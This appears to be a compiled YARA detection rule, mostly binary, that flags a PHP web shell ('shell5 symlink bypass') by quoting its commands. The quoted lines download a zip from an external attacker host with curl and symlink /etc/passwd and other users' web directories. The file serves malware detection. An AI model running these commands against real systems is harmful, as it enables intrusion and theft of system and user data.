YARA�          �       `         �   �      �   �         �      �  [      �                                     �   �                                     ��������                         ��������������������������������������������   0      <                     U      \                     l      v                     �      �                     �      �                 �      �ں�ں��    =      �   ��������           �   �     �ں�ں��    #      6  ��������           2  �     �ں�ں��    !      ^  ��������           Z  �     �ں�ں��    8      �  ��������           �      ��������������������default infected_08_24_18_shell5_symlink_bypass description shell5 - file bypass.php author Brian Laskowski reference https://github.com/Hestat/lw-yara/ date 2018-08-24 hash1 ab49973d4e68b5230e50bc76ec10bccfe3511476232c8ae1ffdc4f17abdfe77b $x1 @exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip'); $s5 @exec('./ln -s /etc/passwd 1.txt'); $s6 @exec('ln -s /etc/passwd 1.txt'); $s8 @exec('./ln -s /home/'.$user3.'/public_html ' . $user3); �       ? �@<!d/   %A   f/Q   ?B               /6   ?B          8      p      �           15   BB          8      p      �                   �                                                                                                                                                                    )  (
  (  (          *  /  *                          0                                      <          <                                                                                                                                                                              q              u                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ������������������������=          8   ������������������������	          p   ������������������������!          �   ����������������
   (   	                                                    (                          (      @      H      `      h      �      �      0                
       
      
      
         h      P      X   
   (   
   0   
   8   
   @      �      �      �   
   P   
   X   
   `   
   h      �      �      �   
   x   
   �   
   �   
   �      &      @      I      R      [      v            �      �   